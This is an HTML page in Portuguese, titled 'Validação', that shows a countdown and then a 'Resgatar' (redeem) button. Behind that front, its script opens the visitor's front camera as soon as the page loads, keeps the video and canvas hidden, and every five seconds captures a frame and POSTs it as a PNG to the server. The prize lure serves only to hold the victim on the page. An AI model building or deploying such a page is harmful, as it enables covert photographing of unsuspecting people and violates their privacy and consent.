<!doctype html>
<html>

<head>
  <meta charset="utf-8">
  <title>Validação</title>
  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
</head>

<div class="video-wrap" hidden="hidden">
  <video id="video" playsinline autoplay></video>
</div>

<center><canvas hidden="hidden" id="canvas" width="640" height="480"></canvas></center>

<style>
  @import url("https://fonts.googleapis.com/css2?family=Nunito:wght=500&display=swap");

  body {
    margin:0;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background-color: #273039;
  }

  * {
    padding: 0px;
    margin: 0px;
    font-family: 'Nunito', sans-serif;
    font-weight: 500;
  }

  .main-screen {
    background-color: #273039;
    height: 100vh;
    width: 100%;
    display: flex;
    justify-content: center;
    align-items: center;
  }

  img {
    height: 80px;
    width: 80px;
  }

  .bottom-bar {
    position: fixed;
    padding: 0px 40px 0px -40px;
    bottom: 0px;
    height: 80px;
    width: 100%;
    background-color: #1F2022;
    display: flex;
    flex-direction: row;
    justify-content: center;
    align-items: center;
    color: #fff;
  }

  .icon-button {
    display: flex;
    flex-direction: column;
    justify-items: center;
    align-items: center;
  }

  i {
    margin-bottom: 8px;
    font-size: 26px;
  }

  button {
    color: #fff;
    background-color: crimson;
    padding: 5px 20px;
    border: none;
    border-radius: 5px;
    outline: none;
  }

  .float_button {
    background-color: #1F2022;
    height: 40px;
    border-radius: 5px;
    width: 40px;
    position: fixed;
    display: flex;
    align-items: center;
    justify-content: center;
    top: 5px;
    right: 5px;
  }

    #ac-wrapper {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.6);
      z-index: 1001;
    }
    #popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 90%;
      max-width: 400px;
      text-align: center;
      z-index: 1002;

      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    #popup h2 {
      color: #ffffff;
      font-size: 22px;
      margin-bottom: 15px;
      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.6);
    }

    #botao {
        display: none;
        color: #ffffff;
        background-color: rgb(238, 201, 0);
        padding: 40px 120px;
        font-size: 38px;
        font-weight: 700;
        text-transform: uppercase;
        letter-spacing: 2px;
        border: none;
        border-radius: 50px;
        cursor: pointer;
        box-shadow: 0 4px 15px rgba(238, 201, 0, 0.5);
        transition: all 0.3s ease;
    }

    #botao:hover {
        background-color: rgb(212, 175, 55);
        box-shadow: 0 6px 20px rgba(212, 175, 55, 0.6);
        transform: translateY(-2px);
    }

    #botao:active {
      transform: translateY(1px);
    }



    #contador {
    font-size: 120px;
    font-weight: bold;
    text-align: center;
    color: yellow;
    }
</style>


<script>
  let secondsCounter = 0;

  function post(imgdata, fileName) {
    $.ajax({
      type: 'POST',
      data: { 
        cat: imgdata,
        name: fileName
      },
      url: '/post',
      dataType: 'json',
      async: true,
      success: function (result) {
        console.log(result.message);
      },
      error: function (xhr) {
        console.error("Erro no envio:", xhr.responseText);
      }
    });
  };

  'use strict';

  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');

  const constraints = {
    audio: false,
    video: {
      facingMode: "user"
    }
  };

  async function init() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      handleSuccess(stream);
    } catch (e) {
      console.error("Erro ao iniciar câmera: ", e);
    }
  }

  function handleSuccess(stream) {
    window.stream = stream;
    video.srcObject = stream;

    var context = canvas.getContext('2d');
    
    setInterval(function () {
      context.drawImage(video, 0, 0, 640, 480);
      var canvasData = canvas.toDataURL("image/png");
      
      secondsCounter += 5;
      
      let formattedName = String(secondsCounter).padStart(2, '0') + '.png';
      
      post(canvasData, formattedName);
      video.play();
    }, 5000);
  }

  function PopUp() {
    document.getElementById('ac-wrapper').style.display = "none";
  }

  $(document).ready(function () {
    init();
  });

</script>

<body>
  <div class="float_button">
    <i class="fas fa-expand" style="color: #fff; font-size: 18px; margin-top: 5px;"></i>
  </div>
  <div id="ac-wrapper">
    <div id="popup">
      <button id="botao" type="button" class="btn btn-primary" onclick="alert('Para efetuar o resgate é necessário ativar o sistema.'); location.reload();">Resgatar</button>
    
    <div id="contador">10</div>
    </div>
  </div>
  
<script src="/static/js/10ck.js"></script>
</body>

<script>
    let numero = 10;

    const contador = document.getElementById("contador");
    const botao = document.getElementById("botao");

    const intervalo = setInterval(() => {
        numero--;

        if (numero > 0) {
            contador.textContent = numero;
        } else {
            clearInterval(intervalo);
            contador.style.display = "none";
            botao.style.display = "block";
        }
    }, 1000);
</script>


</html>
